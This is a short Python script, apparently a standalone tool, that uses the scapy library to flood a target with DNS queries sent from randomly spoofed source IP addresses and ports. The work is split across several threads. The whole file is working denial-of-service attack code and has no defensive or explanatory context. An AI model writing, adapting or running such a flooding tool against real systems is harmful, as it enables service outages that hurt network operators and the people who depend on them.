# -*- coding: utf-8 -*-
from scapy.all import *
from threading import Thread
import time

def SpoofIP():
	return "%s.%s.%s.%s" %(random.randint(1,255),random.randint(1, 255),random.randint(1, 255),random.randint(1, 255))

def SpoofPort():
	return random.randint(10000,65535)

class DNSFlood():
    def __init__(self, dst, qname, qtype, count):
        self.dst   = dst
        self.qname = qname
        self.qtype = qtype
        self.count = count
        print self.dst , self.qname , self.qtype , self.count

    def ThreadStart(self):
        for i in range(10):
            t = Thread(target=self.Start)
            t.start()
            t.join()

    def Start(self):
        for i in range(int(self.count)/10):
            self.Attack()
    def Attack(self):
        self.src_ip = SpoofIP()
        self.src_port = SpoofPort()
        answer = send(IP(src=str(self.src_ip) , dst=str(self.dst)) / UDP(dport=53) / DNS(rd=0, qd=DNSQR(qname=str(self.qname), qtype=str(self.qtype))),
                     verbose=0)
